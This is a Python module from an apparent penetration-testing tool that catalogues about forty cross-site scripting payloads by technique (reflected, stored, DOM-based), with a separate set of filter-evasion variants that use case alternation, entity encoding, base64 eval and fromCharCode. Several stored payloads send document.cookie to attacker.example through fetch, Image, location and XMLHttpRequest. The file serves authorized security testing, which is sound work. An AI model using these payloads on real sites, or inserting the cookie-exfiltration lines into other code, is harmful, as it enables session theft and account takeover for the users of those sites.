"""
XSS Payloads - Cross-Site Scripting payloads with WAF bypass variants.

Provides payloads categorized by technique: reflected, stored, and DOM-based.
Adapted for authorized penetration testing tools.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import List, Optional


@dataclass
class XSSPayload:
    """A single XSS payload."""
    payload: str
    technique: str          # reflected, stored, dom_based
    description: str
    waf_bypass: bool = False
    risk_indicator: str = "xss"


# ---------------------------------------------------------------------------
# Techniques
# ---------------------------------------------------------------------------

ALL_TECHNIQUES = ["reflected", "stored", "dom_based"]


def get_all_techniques() -> List[str]:
    return list(ALL_TECHNIQUES)


# ---------------------------------------------------------------------------
# Reflected XSS payloads (~12)
# ---------------------------------------------------------------------------

_REFLECTED_PAYLOADS = [
    XSSPayload(
        '<script>alert(1)</script>',
        "reflected", "Basic script tag injection",
    ),
    XSSPayload(
        '"><script>alert(1)</script>',
        "reflected", "Break out of attribute with script tag",
    ),
    XSSPayload(
        "'\"><script>alert(1)</script>",
        "reflected", "Break out of single/double quoted attribute",
    ),
    XSSPayload(
        '<img src=x onerror=alert(1)>',
        "reflected", "Image tag onerror handler",
    ),
    XSSPayload(
        '<svg onload=alert(1)>',
        "reflected", "SVG onload event handler",
    ),
    XSSPayload(
        '<svg/onload=alert(1)>',
        "reflected", "SVG onload without space separator",
    ),
    XSSPayload(
        '<body onload=alert(1)>',
        "reflected", "Body onload event handler",
    ),
    XSSPayload(
        '<input onfocus=alert(1) autofocus>',
        "reflected", "Input autofocus with onfocus handler",
    ),
    XSSPayload(
        '<details open ontoggle=alert(1)>',
        "reflected", "Details element ontoggle handler",
    ),
    XSSPayload(
        '<marquee onstart=alert(1)>',
        "reflected", "Marquee onstart event handler",
    ),
    XSSPayload(
        '<a href="javascript:alert(1)">click</a>',
        "reflected", "Anchor tag javascript URI",
    ),
    XSSPayload(
        '<iframe src="javascript:alert(1)">',
        "reflected", "Iframe javascript URI injection",
    ),
]

# ---------------------------------------------------------------------------
# Stored XSS payloads (~8)
# ---------------------------------------------------------------------------

_STORED_PAYLOADS = [
    XSSPayload(
        '<script>document.location="https://attacker.example/?c="+document.cookie</script>',
        "stored", "Cookie exfiltration via document.location",
    ),
    XSSPayload(
        '<img src=x onerror="fetch(\'https://attacker.example/?c=\'+document.cookie)">',
        "stored", "Cookie exfiltration via fetch in img onerror",
    ),
    XSSPayload(
        '<script>new Image().src="https://attacker.example/?c="+document.cookie</script>',
        "stored", "Cookie exfiltration via Image object",
    ),
    XSSPayload(
        '<div onmouseover="alert(document.cookie)">hover here</div>',
        "stored", "Mouseover event on div element",
    ),
    XSSPayload(
        '<script>var x=new XMLHttpRequest();x.open("POST","https://attacker.example/log");x.send(document.cookie)</script>',
        "stored", "Cookie exfiltration via XMLHttpRequest POST",
    ),
    XSSPayload(
        '<textarea onfocus="alert(1)" autofocus>',
        "stored", "Textarea autofocus with onfocus handler",
    ),
    XSSPayload(
        '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart=alert(1)>',
        "stored", "CSS animation onanimationstart handler",
    ),
    XSSPayload(
        '<script>document.write("<img src=x onerror=alert(1)>")</script>',
        "stored", "Persistent DOM write with img onerror",
    ),
]

# ---------------------------------------------------------------------------
# DOM-based XSS payloads (~8)
# ---------------------------------------------------------------------------

_DOM_BASED_PAYLOADS = [
    XSSPayload(
        '#<script>alert(1)</script>',
        "dom_based", "Fragment injection via location.hash",
    ),
    XSSPayload(
        'javascript:alert(document.domain)',
        "dom_based", "javascript URI in document.location sink",
    ),
    XSSPayload(
        '"><img src=x onerror=alert(1)>',
        "dom_based", "innerHTML sink attribute breakout",
    ),
    XSSPayload(
        '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
        "dom_based", "Base64-encoded eval via atob in DOM sink",
    ),
    XSSPayload(
        "'-alert(1)-'",
        "dom_based", "String breakout in eval/setTimeout sink",
    ),
    XSSPayload(
        "\\';alert(1);//",
        "dom_based", "Escaped quote breakout in JS string context",
    ),
    XSSPayload(
        '{{constructor.constructor("alert(1)")()}}',
        "dom_based", "Template engine prototype chain exploitation",
    ),
    XSSPayload(
        "${alert(1)}",
        "dom_based", "Template literal injection in JS context",
    ),
]

# ---------------------------------------------------------------------------
# WAF bypass XSS payloads (~12)
# ---------------------------------------------------------------------------

_WAF_BYPASS_PAYLOADS = [
    XSSPayload(
        '<ScRiPt>alert(1)</sCrIpT>',
        "reflected", "Case alternation to bypass pattern matching", waf_bypass=True,
    ),
    XSSPayload(
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        "reflected", "Nested tag bypass for naive sanitizers", waf_bypass=True,
    ),
    XSSPayload(
        '<script>alert&#40;1&#41;</script>',
        "reflected", "HTML entity encoded parentheses", waf_bypass=True,
    ),
    XSSPayload(
        '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">',
        "reflected", "HTML entity encoded function name in handler", waf_bypass=True,
    ),
    XSSPayload(
        '<img/src=x\tonerror=alert(1)>',
        "reflected", "Tab character as attribute separator", waf_bypass=True,
    ),
    XSSPayload(
        '<img src=x onerror=alert`1`>',
        "reflected", "Template literal backticks instead of parentheses", waf_bypass=True,
    ),
    XSSPayload(
        '<svg><script>alert&lpar;1&rpar;</script></svg>',
        "reflected", "SVG context with HTML entity parentheses", waf_bypass=True,
    ),
    XSSPayload(
        '"><svg/onload=\u0061lert(1)>',
        "reflected", "Unicode escape sequence in event handler", waf_bypass=True,
    ),
    XSSPayload(
        '<img src=x onerror=window["al"+"ert"](1)>',
        "dom_based", "String concatenation to construct alert call", waf_bypass=True,
    ),
    XSSPayload(
        '<img src=x onerror=top[/al/.source+/ert/.source](1)>',
        "dom_based", "Regex source property concatenation bypass", waf_bypass=True,
    ),
    XSSPayload(
        '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
        "dom_based", "Char code construction to bypass keyword filters", waf_bypass=True,
    ),
    XSSPayload(
        '<!--><svg onload=alert(1)>-->',
        "reflected", "HTML comment boundary confusion bypass", waf_bypass=True,
    ),
]


# ---------------------------------------------------------------------------
# All payloads combined
# ---------------------------------------------------------------------------

_ALL_PAYLOADS = {
    "reflected": _REFLECTED_PAYLOADS,
    "stored": _STORED_PAYLOADS,
    "dom_based": _DOM_BASED_PAYLOADS,
}

# WAF bypass payloads are stored separately but included in flat lists
_ALL_LISTS = [_REFLECTED_PAYLOADS, _STORED_PAYLOADS, _DOM_BASED_PAYLOADS, _WAF_BYPASS_PAYLOADS]


def get_xss_payloads(technique: Optional[str] = None) -> List[XSSPayload]:
    """Get XSS payloads filtered by technique.

    Parameters
    ----------
    technique : str, optional
        XSS technique: reflected, stored, dom_based.
        If None, returns all non-WAF-bypass payloads across all techniques.

    Returns
    -------
    list of XSSPayload
    """
    if technique:
        return list(_ALL_PAYLOADS.get(technique, []))
    result: List[XSSPayload] = []
    for payloads in _ALL_PAYLOADS.values():
        result.extend(payloads)
    return result


def get_waf_bypass_payloads() -> List[XSSPayload]:
    """Get only WAF bypass XSS payloads."""
    return list(_WAF_BYPASS_PAYLOADS)


def get_all_payloads_flat() -> List[XSSPayload]:
    """Return all payloads including WAF bypass variants."""
    result: List[XSSPayload] = []
    for payload_list in _ALL_LISTS:
        result.extend(payload_list)
    return result
